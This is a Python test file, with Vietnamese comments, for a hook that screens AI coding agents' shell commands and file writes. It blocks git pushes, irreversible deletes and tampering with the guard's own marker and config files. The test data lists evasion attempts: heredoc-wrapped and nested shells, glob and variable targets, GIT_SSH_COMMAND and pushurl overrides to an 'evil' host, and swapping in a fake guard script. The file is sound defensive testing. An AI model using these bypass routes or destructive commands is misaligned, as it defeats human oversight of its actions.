    plain = make_repo(tmp_path / "p", branch="spr-12")
    marked = make_repo(tmp_path / "m", branch="spr-12", marker=good_marker())
    path = [bare_sh_ok, Path(sys.executable).parent]
    evil = tmp_path / "evil.py"
    evil.write_text("import sys\nsys.exit(0)\n", encoding="utf-8")
    done = run_launcher(marked, claude("git push", marked), path, {"AUTOPILOT_GUARD_PATH": fwd(evil)})
    if "không chạy được Python" in done.stderr:
        pytest.skip("launcher không thấy Python dùng được trong PATH thử")
    assert done.returncode == 2 and "'push'" in done.stderr  # guard thật vẫn chạy, giả không thay được
    assert run_launcher(plain, claude("git status", plain), path, {"AUTOPILOT_GUARD_PATH": fwd(evil)}).returncode == 0


def test_launcher_clear_does_not_read_stdin(tmp_path, bare_sh_ok):
    repo = make_repo(tmp_path / "r", branch="spr-12", marker=good_marker())
    path = [bare_sh_ok, Path(sys.executable).parent]
    import subprocess
    env = {"PATH": os.pathsep.join(str(d) for d in path), "CLAUDE_PROJECT_DIR": fwd(repo)}
    for key in ("SystemRoot", "SYSTEMROOT", "TEMP", "TMP", "HOME"):
        if key in os.environ:
            env[key] = os.environ[key]
    done = subprocess.run([SH, fwd(LAUNCHER), "--clear", fwd(repo)], stdin=subprocess.DEVNULL, capture_output=True, text=True, encoding="utf-8",
                          cwd=str(tmp_path), env=env, timeout=30)
    if "không chạy được Python" in done.stderr:
        pytest.skip("launcher không thấy Python dùng được trong PATH thử")
    assert done.returncode == 0 and not (repo / ".tmp" / "autopilot.json").exists()


@pytest.mark.parametrize("cmd,item", [
    ("find .tmp -type f -exec rm {} +", "marker"), ("find .tmp -exec rm {} \\;", "marker"), ("find . -exec rm {} +", "marker"),
    ("find .tmp -execdir mv {} /tmp +", "marker"), ("find . -name '*.json' -exec sed -i s/a/b/ {} +", "marker"),
    ("find .tmp -name '*.json' -delete", "irreversible_delete"),
])
def test_guard_find_exec_over_marker_dir(tmp_path, cmd, item):
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    rc, _, err = run("claude", claude(cmd, repo))
    assert rc == 2, (cmd, err)
    assert (MARKER_REASON if item == "marker" else "'irreversible_delete'") in err


def test_guard_find_exec_elsewhere_or_read_only_allowed(tmp_path):
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    (repo / "build").mkdir()
    for cmd in ("find build -exec rm {} +", "find . -name '*.py'", "find .tmp -exec grep level {} +", "find . -exec cat {} +",
                "find .tmp -name x -print", "find build -type f -exec ls {} +"):
        assert_allowed(repo, cmd)


def test_guard_absolute_paths_from_outside_the_tree(tmp_path, outside):
    """RF12: sự kiện có cwd ngoài cây có file dấu; đường tuyệt đối/tương đối vào cây đó vẫn bị bảo vệ."""
    repo = make_repo(tmp_path / "r", branch="spr-12", marker=good_marker())
    r, rel = fwd(repo), fwd(os.path.relpath(repo, outside))
    for cmd in ("rm {r}/.tmp/autopilot.json", "rm -f {r}/.tmp/*", "rm -f {rel}/.tmp/autopilot.json", "rm -f '{r}/.tmp/AUTOPILOT.JSON'",
                "mv {r}/.tmp/autopilot.json {r}/x", "mv {r}/.tmp {r}/old", "mv {rel}/.tmp x", "Remove-Item {r}\\.tmp\\autopilot.json",
                "echo x > {r}/.tmp/autopilot.json", "cp x {r}/.tmp/autopilot.json", "find {r}/.tmp -exec rm {{}} +",
                "bash -c 'rm {r}/.tmp/autopilot.json'"):
        rc, _, err = run("claude", claude(cmd.format(r=r, rel=rel), outside))
        assert rc == 2 and MARKER_REASON in err, (cmd, err)
    for cmd in ("rm -rf {r}", "rm -rf {rel}", "rm -rf {r}/build", "rm -rf {r}/.tmp", "git -C {r} reset --hard"):
        rc, _, err = run("claude", claude(cmd.format(r=r, rel=rel), outside))
        assert rc == 2 and "irreversible_delete" in err, (cmd, err)
    # chỉ-đọc và cây khác không bị chặn
    for cmd in ("cat {r}/.tmp/autopilot.json", "ls {r}/.tmp", "rm -f {o}/x.txt", "rm -rf {o}/y"):
        assert_allowed(outside, cmd.format(r=r, o=fwd(outside)))
    # dọn thư mục tạm bên trong .tmp của cây đó bằng đường tuyệt đối: cho qua (không đụng file dấu)
    (repo / ".tmp" / "scratch").mkdir()
    assert_allowed(outside, "rm -rf {r}/.tmp/scratch".format(r=r))
    assert_allowed(outside, "echo x > {r}/.tmp/notes.txt".format(r=r))


def test_guard_write_tool_absolute_path_from_outside(tmp_path, outside):
    repo = make_repo(tmp_path / "r", branch="spr-12", marker=good_marker())
    for target in (str(repo / ".tmp" / "autopilot.json"), fwd(os.path.relpath(repo / ".tmp" / "autopilot.json", outside))):
        rc, _, err = run("claude", {"tool_name": "Write", "tool_input": {"file_path": target, "content": "{}"}, "cwd": str(outside)})
        assert rc == 2 and MARKER_REASON in err, target
    assert run("claude", {"tool_name": "Write", "tool_input": {"file_path": str(repo / "a.md")}, "cwd": str(outside)}) == (0, "", "")
    # đích là cây không có file dấu (điều phối chép file dấu vào worktree mới): qua
    fresh = tmp_path / "fresh"
    (fresh / ".tmp").mkdir(parents=True)
    assert run("claude", {"tool_name": "Write", "tool_input": {"file_path": str(fresh / ".tmp" / "autopilot.json")}, "cwd": str(outside)}) == (0, "", "")


def test_guard_clear_command_from_outside_still_allowed(tmp_path, outside):
    repo = make_repo(tmp_path / "r", branch="spr-12", marker=good_marker())
    cmd = "python {g} --clear {r}".format(g=fwd(SCRIPTS / "autopilot_guard.py"), r=fwd(repo))
    assert_allowed(outside, cmd)


def test_guard_cp_marker_as_source_only(tmp_path):
    """N2 (TK8 re-review B): điều phối chép file dấu vào worktree phiên con (nguồn = file dấu) qua; đích = file dấu đang bật, mv: chặn."""
    repo = make_repo(tmp_path / "r", branch="spr-12", marker=good_marker())
    wt = tmp_path / "wt"
    (wt / ".tmp").mkdir(parents=True)
    r, w = fwd(repo), fwd(wt)
    for cmd in ("cp {r}/.tmp/autopilot.json {w}/.tmp/autopilot.json", "cp .tmp/autopilot.json {w}/.tmp/", "cp -f .tmp/autopilot.json {w}/.tmp/x.json",
                "Copy-Item .tmp/autopilot.json {w}/.tmp/autopilot.json", "Copy-Item -Path .tmp/autopilot.json -Destination {w}/.tmp/autopilot.json",
                "cp -t {w}/.tmp .tmp/autopilot.json", "cp {r}/.tmp/autopilot.json {w}/.tmp/autopilot.json"):
        assert_allowed(repo, cmd.format(r=r, w=w))
    for cmd in ("cp {w}/.tmp/autopilot.json {r}/.tmp/autopilot.json", "cp x .tmp/autopilot.json", "cp .tmp/autopilot.json .tmp/autopilot.json",
                "cp -t .tmp x", "Copy-Item x -Destination .tmp/autopilot.json", "Copy-Item x .tmp\\autopilot.json",
                "mv .tmp/autopilot.json {w}/.tmp/autopilot.json", "Move-Item .tmp/autopilot.json {w}", "cp .tmp/autopilot.json x > .tmp/autopilot.json"):
        assert_marker_blocked(repo, cmd.format(r=r, w=w))


@pytest.mark.parametrize("cmd", [
    "python - <<EOF\ngit push\nEOF", "python - <<'EOF'\nrm -rf build\ngit push\nEOF", "node - <<-EOF\n\tgit push\n\tEOF",
    "cat > notes.txt <<EOF\ngit push\nEOF", "python3 - <<\"PY\"\nsubprocess.run(['git','push'])\ngit push\nPY",
    "python - <<EOF\ngit push\nEOF\ngit status", "cat <<EOF\ngit push\nEOF", "tee out.txt <<EOF\ngit push\nEOF",
])
def test_guard_heredoc_body_for_non_shell_is_data(tmp_path, cmd):
    """N3: thân heredoc cho python/node/cat… là dữ liệu, không bị coi là lệnh."""
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    assert_allowed(repo, cmd)


@pytest.mark.parametrize("cmd,item", [
    ("bash <<EOF\ngit push\nEOF", "push"), ("sh <<'EOF'\nrm -rf build\nEOF", "irreversible_delete"), ("bash -s <<-EOF\n\tgit push\n\tEOF", "push"),
    ("pwsh <<EOF\ngit push\nEOF", "push"), ("cat <<EOF | bash\ngit push\nEOF", "push"), ("python - <<EOF\nx\nEOF\ngit push", "push"),
    ("cat > f <<EOF\nx\nEOF\ngit push", "push"), ("eval <<EOF\ngit push\nEOF", "push"),
    ("python - <<EOF\nx\nEOF\ncat <<EOF2 > .tmp/autopilot.json\ny\nEOF2", "marker"),
])
def test_guard_heredoc_body_for_shell_still_analyzed(tmp_path, cmd, item):
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    rc, _, err = run("claude", claude(cmd, repo))
    assert rc == 2, (cmd, err)
    assert (MARKER_REASON if item == "marker" else "'{}'".format(item)) in err


@pytest.mark.parametrize("cmd", ["git stash -u", "git stash --include-untracked", "git stash -a", "git stash --all", "git stash push -u",
                                 "git stash push --include-untracked -m x", "git stash -ua", "git -C . stash -u"])
def test_guard_stash_with_untracked_blocked(tmp_path, cmd):
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    assert_marker_blocked(repo, cmd)


def test_guard_stash_plain_allowed(tmp_path):
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    for cmd in ("git stash", "git stash list", "git stash pop", "git stash push -m x", "git stash show -p"):
        assert_allowed(repo, cmd)


def test_guard_old_python_guard_falls_back(tmp_path, monkeypatch):
    """Python < 3.9: không phân tích, chỉ dò file dấu từ thư mục tiến trình (hàm lưới cuối)."""
    repo = make_repo(tmp_path / "r", branch="spr-12", marker=good_marker())
    plain = tmp_path / "p"
    plain.mkdir()
    import contextlib
    monkeypatch.chdir(repo)
    out, err = io.StringIO(), io.StringIO()
    with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
        assert autopilot_guard._last_resort(["--format", "claude"]) == 2
    monkeypatch.chdir(plain)
    with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
        assert autopilot_guard._last_resort(["--format", "claude"]) == 0
        assert autopilot_guard._last_resort(["--format=antigravity"]) == 0


# ===================== TK8 vòng sửa 3: heredoc theo nháy, file dấu lồng trong .tmp =====================

@pytest.mark.parametrize("cmd", [
    "echo 'a <<END'\ngit push",
    'git commit -m "x <<EOF"\ngit push origin HEAD',
    "echo \"y <<'EOF'\"\ngit push",
    "echo hi # <<EOF\ngit push",
    "echo a <<<'x <<EOF'\ngit push",
    "cat <<EOF\ngit push",  # không có dòng kết thúc: giữ thân để phân tích
    "python - <<EOF\nprint(1)\ngit push\nEOFX",  # nhãn kết thúc phải khớp đúng
    "python - <<EOF\nprint(1)\n EOF\ngit push",  # thụt lề không phải dòng kết thúc của <<
    "echo 'multi\nline <<EOF'\ngit push\nEOF",
])
def test_guard_heredoc_only_outside_quotes_and_comments(tmp_path, cmd):
    """RF16: `<<` trong nháy hay comment, hoặc heredoc không có dòng kết thúc, không được che lệnh thật."""
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    assert_blocked(repo, cmd, "push")


def test_guard_real_heredoc_still_data(tmp_path):
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    for cmd in ("python - <<EOF\ngit push\nEOF", "python - <<'EOF'\ngit push\nEOF", "node - <<-EOF\n\tgit push\n\tEOF",
                "cat > f <<EOF\ngit push\nEOF", "python - <<EOF\nx = '<<'\ngit push\nEOF\ngit status"):
        assert_allowed(repo, cmd)


def test_guard_tmp_cleanup_not_applied_when_target_contains_nested_marker(tmp_path):
    """RF15/RF17/G3: dọn thư mục trong .tmp/ có chứa .tmp/autopilot.json lồng bên trong thì chặn; --clear từng thư mục rồi mới xoá được."""
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    nested = repo / ".tmp" / "livetest"
    (nested / ".tmp").mkdir(parents=True)
    (nested / ".git").mkdir()
    (nested / ".tmp" / "AutoPilot.JSON").write_text("{}", encoding="utf-8")
    deep = repo / ".tmp" / "wrap" / "a" / "b" / "c"
    (deep / ".tmp").mkdir(parents=True)
    (deep / ".tmp" / "autopilot.json").write_text("{}", encoding="utf-8")
    for cmd in ("rm -rf .tmp/livetest", "rm -rf .tmp/wrap", "Remove-Item -Recurse -Force .tmp\\livetest", "rm -rf .tmp/live*", "rm -rf .tmp/wrap/a"):
        assert_blocked(repo, cmd, "irreversible_delete")
    assert_allowed(repo, "python {g} --clear {d}".format(g=fwd(SCRIPTS / "autopilot_guard.py"), d=fwd(nested)))
    assert_allowed(repo, "python {g} --clear {d}".format(g=fwd(SCRIPTS / "autopilot_guard.py"), d=fwd(deep)))
    assert clear_cli(nested)[0] == 0 and clear_cli(deep)[0] == 0  # chạy thật --clear từng thư mục
    assert_allowed(repo, "rm -rf .tmp/livetest")
    assert_allowed(repo, "rm -rf .tmp/wrap")
    assert_allowed(repo, "rm -rf .tmp/live*")


def test_guard_tmp_cleanup_walk_limits_fail_closed(tmp_path, monkeypatch):
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    too_deep = repo / ".tmp" / "d" / "1" / "2" / "3" / "4" / "5" / "6" / "7"
    too_deep.mkdir(parents=True)
    assert_blocked(repo, "rm -rf .tmp/d", "irreversible_delete")  # sâu quá 6 cấp: không kiểm hết được → coi như có
    shallow = repo / ".tmp" / "shallow" / "1" / "2"
    shallow.mkdir(parents=True)
    (shallow / ".git").mkdir()  # .git bị bỏ qua khi dò
    assert_allowed(repo, "rm -rf .tmp/shallow")
    real_walk = os.walk

    def failing_walk(top, **kwargs):
        if kwargs.get("onerror"):
            kwargs["onerror"](OSError("denied"))
        return iter(())

    monkeypatch.setattr(os, "walk", failing_walk)
    assert_blocked(repo, "rm -rf .tmp/shallow", "irreversible_delete")
    monkeypatch.setattr(os, "walk", real_walk)


def test_guard_unquoted_heredoc_expands_command_substitution(tmp_path):
    """RF9 (re-review A vòng 3): nhãn không nháy thì shell mở rộng `$(…)` và backtick trong thân → xét như lệnh lồng; nhãn có nháy thì không."""
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    for cmd in ("python - <<X\nx = $(git push)\nX", "cat > f <<X\nrun `git push origin main`\nX", "cat <<-X\n\t$(rm -rf build)\n\tX",
                "python - <<X\na $(echo $(git push)) b\nX", "tee f <<EOF\n$(gh pr merge 3)\nEOF"):
        rc, _, err = run("claude", claude(cmd, repo))
        assert rc == 2, (cmd, err)
    for cmd in ("python - <<'X'\nx = $(git push)\nX", 'python - <<"X"\nx = $(git push)\nX', "cat > f <<\\X\n`git push` x\nX",
                "python - <<X\nx = $(git status) $((1+2)) `ls`\nX", "python - <<X\nplain text git push\nX"):
        assert_allowed(repo, cmd)



def test_guard_continuation_before_heredoc_scan(tmp_path):
    """RF19 (hồi quy fix 4): `bash` + dấu gạch ngược + xuống dòng + `<<EOF` — nối dòng trước khi dò heredoc, nên thân vẫn được phân tích."""
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    for cmd in ("bash \\\n<<EOF\ngit push\nEOF", "sh \\\n-s <<EOF\ngit push\nEOF", "bash \\\n<<'EOF'\ngit push\nEOF",
                "bash -s \\\n  <<-EOF\n\tgit push\n\tEOF"):
        assert_blocked(repo, cmd, "push")
    assert_allowed(repo, "python - \\\n<<'EOF'\ngit push\nEOF")  # trình không phải shell: thân vẫn là dữ liệu
    assert_allowed(repo, "python - \\\n<<EOF\nx\nEOF\ngit status")


# --- hợp đồng đích khi tự đẩy (SPR-16 TK7): bốn khoá file dấu --------------------------------------------------------

PUSH_KEYS = {"push_remote": "origin", "push_urls": ["https://example.com/o/r.git"],
             "push_targets": ["refs/heads/spr-16-x"], "git_common_dir": "/work/repo/.git"}
NO_PUSH = [e for e in ALL if e not in ("push",)]


def write_marker(tmp_path, **extra):
    data = {"level": "gate_1_2", "scope": ["gate_1", "gate_2"], "expires": "sprint_end", "exclusions": NO_PUSH,
            "grant_at": "2026-11-20 09:00 +07", "sprints": ["SPR-20"]}
    data.update(extra)
    path = tmp_path / "autopilot.json"
    path.write_text(json.dumps(data), encoding="utf-8")
    return str(path)


def test_push_contract_loaded_when_push_dropped_and_keys_valid(tmp_path):
    assert autopilot_guard.load_push_contract(write_marker(tmp_path, **PUSH_KEYS)) == PUSH_KEYS


@pytest.mark.parametrize("change", [
    {"push_remote": None}, {"push_remote": ""}, {"push_urls": []}, {"push_urls": "https://x"}, {"push_urls": [1]},
    {"push_targets": []}, {"push_targets": ["main"]}, {"push_targets": ["refs/heads/a", 5]}, {"git_common_dir": ""},
    {"git_common_dir": None}, {"exclusions": ALL},
], ids=["remote-none", "remote-empty", "urls-empty", "urls-str", "urls-int", "targets-empty", "target-not-ref",
        "target-mixed", "gitdir-empty", "gitdir-none", "push-still-excluded"])
def test_push_contract_absent_when_keys_invalid(tmp_path, change):
    keys = dict(PUSH_KEYS)
    keys.update(change)
    assert autopilot_guard.load_push_contract(write_marker(tmp_path, **keys)) is None


def test_push_contract_absent_when_a_key_is_missing_or_file_broken(tmp_path):
    for key in PUSH_KEYS:
        keys = {k: v for k, v in PUSH_KEYS.items() if k != key}
        assert autopilot_guard.load_push_contract(write_marker(tmp_path, **keys)) is None
    broken = tmp_path / "broken.json"
    broken.write_text("{", encoding="utf-8")
    assert autopilot_guard.load_push_contract(str(broken)) is None
    assert autopilot_guard.load_push_contract(str(tmp_path / "missing.json")) is None


def test_load_active_still_blocks_push_even_with_contract(tmp_path):
    """Hợp đồng chỉ mở đường cho `git_fence.push_contract`; `load_active` giữ nguyên: thiếu `push` vẫn được bổ sung đủ."""
    active, broken = autopilot_guard.load_active(write_marker(tmp_path, **PUSH_KEYS))
    assert "push" in active and not broken


# --- rào git thường trực qua entrypoint thật `main()` (SPR-16 TK8, FR4.8) ----------------------------------------------

import git_fence  # noqa: E402


def protected_repo(tmp_path, branch="main", marker=None):
    repo = make_repo(tmp_path, branch=branch, marker=marker)
    (repo / ".agile.json").write_text("{}", encoding="utf-8")
    return repo


def test_fence_push_without_marker_per_host(tmp_path):
    repo = protected_repo(tmp_path)
    payload = claude("git push origin HEAD:main", repo)
    rc, out, err = run("claude", payload)
    answer = json.loads(out)["hookSpecificOutput"]
    assert rc == 0 and err == "" and answer["permissionDecision"] == "ask" and "git-fence" in answer["permissionDecisionReason"]
    rc, out, err = run("codex", payload)
    assert rc == 2 and out == "" and "git-fence" in err and "Đức tự chạy" in err and "bấm cho phép" not in err
    rc, out, err = run("antigravity", {"toolCall": {"name": "run_command", "args": {"CommandLine": "git push origin HEAD:main", "Cwd": str(repo)}}})
    assert rc == 0 and json.loads(out)["decision"] == "deny"


def test_fence_forced_push_and_local_main_commit_are_denied_for_claude(tmp_path):
    repo = protected_repo(tmp_path)
    for cmd in ("git push --force origin x", "git commit -m x", "git pull", "gh release create v1"):
        rc, out, err = run("claude", claude(cmd, repo))
        assert rc == 2 and "git-fence" in err, cmd


def test_fence_neutral_commands_pass_without_touching_git(tmp_path, monkeypatch):
    repo = protected_repo(tmp_path)
    calls = []
    monkeypatch.setattr(git_fence, "default_runner", lambda *a, **k: calls.append(a) or (-1, ""))
    for cmd in ("git status", "git log -3", "git diff", "ls -la", "gh pr view 1"):
        assert run("claude", claude(cmd, repo)) == (0, "", ""), cmd
    assert calls == []


def test_fence_unprotected_repo_is_not_touched(tmp_path, monkeypatch):
    repo = make_repo(tmp_path)
    monkeypatch.setattr(git_fence, "default_runner", lambda *a, **k: (1, ""))  # `git ls-files` báo không theo dõi
    assert run("claude", claude("git push origin HEAD:main", repo)) == (0, "", "")


def test_fence_write_tool_on_agile_json_denied_without_marker(tmp_path):
    repo = protected_repo(tmp_path)
    payload = {"tool_name": "Write", "tool_input": {"file_path": str(repo / ".agile.json"), "content": "{}"}, "cwd": str(repo)}
    rc, out, err = run("claude", payload)
    assert rc == 2 and "git-fence" in err and ".agile.json" in err
    ok = {"tool_name": "Write", "tool_input": {"file_path": str(repo / "README.md"), "content": "x"}, "cwd": str(repo)}
    assert run("claude", ok) == (0, "", "")


def test_fence_list_file_is_guarded_by_write_tool(tmp_path, monkeypatch):
    repo = make_repo(tmp_path)
    listing = tmp_path / "protected.json"
    listing.write_text(json.dumps({"repos": [{"git_common_dir": str(repo / ".git")}]}), encoding="utf-8")
    monkeypatch.setenv(git_fence.ENV_LIST, str(listing))
    payload = {"tool_name": "Edit", "tool_input": {"file_path": str(listing)}, "cwd": str(repo)}
    rc, _, err = run("claude", payload)
    assert rc == 2 and "git-fence" in err


def test_fence_shell_write_to_agile_json_denied(tmp_path):
    repo = protected_repo(tmp_path)
    for cmd in ("echo {} > .agile.json", "rm .agile.json", "git rm --cached .agile.json"):
        rc, _, err = run("claude", claude(cmd, repo))
        assert rc == 2, cmd
    assert run("claude", claude("cat .agile.json", repo)) == (0, "", "")


def test_fence_bad_json_in_protected_repo_denies_but_not_elsewhere(tmp_path, monkeypatch):
    repo = protected_repo(tmp_path)
    monkeypatch.chdir(repo)
    rc, _, err = run("claude", "{")
    assert rc == 2 and "git-fence" in err
    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()
    monkeypatch.chdir(elsewhere)
    assert run("claude", "{") == (0, "", "")


def test_fence_internal_error_in_protected_repo_denies(tmp_path, monkeypatch):
    repo = protected_repo(tmp_path)

    def boom(*a, **k):
        raise RuntimeError("x")

    monkeypatch.setattr(git_fence, "classify", boom)
    rc, _, err = run("claude", claude("git push origin x", repo))
    assert rc == 2 and "RuntimeError" in err
    clean = make_repo(tmp_path, name_dir="clean", branch="x") if False else None
    assert clean is None


def test_fence_runner_failure_closes_push_contract(tmp_path, monkeypatch):
    marker = {"level": "gate_1_2", "scope": ["gate_1", "gate_2"], "expires": "sprint_end", "exclusions": NO_PUSH,
              "grant_at": "2026-11-20 09:00 +07", "sprints": ["SPR-20"], "push_remote": "origin",
              "push_urls": ["https://example.com/o/r.git"], "push_targets": ["refs/heads/spr-20-x"], "git_common_dir": ""}
    repo = protected_repo(tmp_path, branch="spr-20-x", marker=marker)
    marker["git_common_dir"] = str(repo / ".git")
    (repo / ".tmp" / "autopilot.json").write_text(json.dumps(marker), encoding="utf-8")
    (repo / ".git" / "config").write_text('[remote "origin"]\n\turl = https://example.com/o/r.git\n', encoding="utf-8")
    heads = repo / ".git" / "refs" / "remotes" / "origin"
    heads.mkdir(parents=True)
    (heads / "HEAD").write_text("ref: refs/remotes/origin/main\n", encoding="utf-8")
    listing = tmp_path / "protected.json"
    listing.write_text(json.dumps({"repos": [{"git_common_dir": str(repo / ".git")}]}), encoding="utf-8")
    rc, _, err = run("claude", claude("git push origin spr-20-x", repo))  # chưa đặt biến danh sách: dấu hiệu 1 không xác định
    assert rc == 2 and "push-repo-unverified" in err
    monkeypatch.setenv(git_fence.ENV_LIST, str(listing))
    monkeypatch.setattr(git_fence, "default_runner", lambda *a, **k: (-1, ""))
    rc, _, err = run("claude", claude("git push origin spr-20-x", repo))
    assert rc == 2 and "push-url-unverified" in err
    monkeypatch.setattr(git_fence, "default_runner", lambda argv, cwd, t: (0, "https://example.com/o/r.git\n"))
    assert run("claude", claude("git push origin spr-20-x", repo)) == (0, "", "")
    rc, _, err = run("claude", claude("git push origin HEAD:main", repo))
    assert rc == 2 and "push-target-unknown" in err


def test_fence_nested_shell_commands_are_seen(tmp_path):
    repo = protected_repo(tmp_path)
    for cmd in ("bash -c 'git push origin x'", "sh -c \"git commit -m x\"", "echo 'git push origin x' | bash",
                "cd sub && git commit -m x"):
        rc, out, err = run("claude", claude(cmd, repo))
        assert rc == 2 or json.loads(out)["hookSpecificOutput"]["permissionDecision"] == "ask", cmd


def test_fence_autopilot_reason_text_unchanged_when_marker_blocks_push(tmp_path):
    repo = protected_repo(tmp_path, marker={"level": "gate_1", "scope": ["gate_1"], "expires": "sprint_end", "exclusions": ALL,
                                            "grant_at": "2026-11-20 09:00 +07", "sprints": ["SPR-20"]})
    rc, _, err = run("claude", claude("git push origin x", repo))
    assert rc == 2 and err.startswith("autopilot: 'push'")


def test_launcher_without_python_blocks_in_agile_json_repo(tmp_path, bare_sh_ok):
    """Rào git thường trực đóng khi guard không chạy được (FR4.8): repo có `.agile.json` mà không có Python thì chặn, repo khác cho qua."""
    repo = make_repo(tmp_path / "r", branch="spr-12")
    (repo / ".agile.json").write_text("{}", encoding="utf-8")
    sub = repo / "src"
    sub.mkdir()
    for cwd in (repo, sub):
        done = run_launcher(cwd, claude("git push", cwd), [bare_sh_ok])
        assert done.returncode == 2 and "git-fence" in done.stderr, done.stderr
    plain = make_repo(tmp_path / "p", branch="spr-12")
    assert run_launcher(plain, claude("git push", plain), [bare_sh_ok]).returncode == 0


def test_launcher_fallback_closes_when_index_still_tracks_agile_json(tmp_path, bare_sh_ok):
    """Dấu hiệu 3 ở nhánh dự phòng (Astra RV6): `.agile.json` đã xoá khỏi cây làm việc nhưng chỉ mục còn → vẫn chặn khi không có Python."""
    import shutil
    import subprocess
    real_git = shutil.which("git")
    if real_git is None:
        pytest.skip("không có git")
    shim_dir = tmp_path / "shim"
    shim_dir.mkdir()
    shim = shim_dir / "git"
    shim.write_text('#!/bin/sh\nexec "{}" "$@"\n'.format(fwd(real_git)), encoding="utf-8")
    os.chmod(shim, 0o755)
    repo = tmp_path / "idx"
    repo.mkdir()
    env = dict(os.environ, GIT_CONFIG_GLOBAL=os.devnull, GIT_CONFIG_SYSTEM=os.devnull)
    for args in (["init", "-q"], ["config", "user.email", "t@e.x"], ["config", "user.name", "t"]):
        subprocess.run(["git", "-C", str(repo), *args], check=True, env=env)
    (repo / ".agile.json").write_text("{}", encoding="utf-8")
    subprocess.run(["git", "-C", str(repo), "add", ".agile.json"], check=True, env=env)
    subprocess.run(["git", "-C", str(repo), "commit", "-q", "-m", "x"], check=True, env=env)
    (repo / ".agile.json").unlink()  # xoá khỏi cây làm việc, chỉ mục vẫn theo dõi
    done = run_launcher(repo, claude("git push", repo), [shim_dir, bare_sh_ok])
    if done.returncode == 0:
        pytest.skip("launcher tìm thấy Python dùng được (guard chạy bình thường)")
    assert done.returncode == 2 and "git-fence" in done.stderr, done.stderr


# --- security review SC1–SC3 (SPR-16 vòng 2) ----------------------------------------------------------------------------------

def contract_world(tmp_path, monkeypatch):
    """Repo có file dấu với hợp đồng đích hợp lệ, danh sách bảo vệ có repo, runner trả URL khớp: một lệnh đẩy hợp lệ phải qua."""
    marker = {"level": "gate_1_2", "scope": ["gate_1", "gate_2"], "expires": "sprint_end", "exclusions": NO_PUSH,
              "grant_at": "2026-11-20 09:00 +07", "sprints": ["SPR-20"], "push_remote": "origin",
              "push_urls": ["https://example.com/o/r.git"], "push_targets": ["refs/heads/spr-20-x"], "git_common_dir": ""}
    repo = protected_repo(tmp_path, branch="spr-20-x", marker=marker)
    marker["git_common_dir"] = str(repo / ".git")
    (repo / ".tmp" / "autopilot.json").write_text(json.dumps(marker), encoding="utf-8")
    (repo / ".git" / "config").write_text('[remote "origin"]\n\turl = https://example.com/o/r.git\n', encoding="utf-8")
    heads = repo / ".git" / "refs" / "remotes" / "origin"
    heads.mkdir(parents=True)
    (heads / "HEAD").write_text("ref: refs/remotes/origin/main\n", encoding="utf-8")
    listing = tmp_path / "protected.json"
    listing.write_text(json.dumps({"repos": [{"git_common_dir": str(repo / ".git")}]}), encoding="utf-8")
    monkeypatch.setenv(git_fence.ENV_LIST, str(listing))
    monkeypatch.setattr(git_fence, "default_runner", lambda argv, cwd, t: (0, "https://example.com/o/r.git\n"))
    return repo


def test_contract_push_passes_in_the_clean_world(tmp_path, monkeypatch):
    repo = contract_world(tmp_path, monkeypatch)
    assert run("claude", claude("git push origin spr-20-x", repo)) == (0, "", "")


@pytest.mark.parametrize("cmd", [
    "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.pushurl GIT_CONFIG_VALUE_0=https://evil/x git push origin spr-20-x",
    "env GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=url.https://evil/.insteadOf GIT_CONFIG_VALUE_0=https://example.com/ git push origin spr-20-x",
    "GIT_SSH_COMMAND=evil git push origin spr-20-x",
    "GIT_CONFIG_PARAMETERS=x git push origin spr-20-x",
    "GIT_CONFIG_GLOBAL=/tmp/x git push origin spr-20-x",
    "export GIT_CONFIG_COUNT=1 && git push origin spr-20-x",
    "$env:GIT_SSH_COMMAND='evil'; git push origin spr-20-x",
])
def test_git_environment_variables_void_the_push_contract(tmp_path, monkeypatch, cmd):
    repo = contract_world(tmp_path, monkeypatch)
    rc, _, err = run("claude", claude(cmd, repo))
    assert rc == 2 and "push-repo-unverified" in err, (cmd, err)


def test_repo_with_include_makes_unknown_subcommands_unparsed(tmp_path):
    repo = protected_repo(tmp_path, branch="x")
    with open(repo / ".git" / "config", "a", encoding="utf-8") as handle:
        handle.write("[include]\n\tpath = extra.cfg\n")
    assert run("claude", claude("git p origin HEAD:main", repo))[0] == 2  # alias có thể nằm trong file được include
    assert run("claude", claude("git status", repo)) == (0, "", "")


@pytest.mark.parametrize("cmd", [
    "rm .agil*", "rm .agile.js?n", "rm *.json", "rm $(echo .agile).json", "F=.agile.json; rm $F",
    'echo {} > "$AGENT_AGILE_PROTECTED_REPOS"', "cp /dev/null $AGENT_AGILE_PROTECTED_REPOS",
    "cd sub && rm .agile.json", "mv .agile.json .agile.bak",
    "cd sub && rm ../.agil*", "cd sub && rm ../*.json", "cd sub && rm *.json", "rm sub/../.agil*", "rm ./*.json",
])
def test_dynamic_and_glob_targets_of_the_guard_files_are_denied(tmp_path, cmd):
    repo = protected_repo(tmp_path)
    (repo / "sub").mkdir()
    rc, _, err = run("claude", claude(cmd, repo))
    assert rc == 2 and "git-fence" in err, (cmd, err)


@pytest.mark.parametrize("cmd", ["rm build/*.o", "rm -f out.txt", "cp a.txt b.txt", "echo hi > notes.txt", "rm $TMPDIR/x", "touch $HOME/f"])
def test_ordinary_file_commands_in_protected_repo_are_not_blocked(tmp_path, cmd):
    repo = protected_repo(tmp_path)
    assert run("claude", claude(cmd, repo)) == (0, "", ""), cmd


def test_absolute_glob_at_repo_root_is_denied_even_after_cd(tmp_path):
    repo = protected_repo(tmp_path)
    (repo / "sub").mkdir()
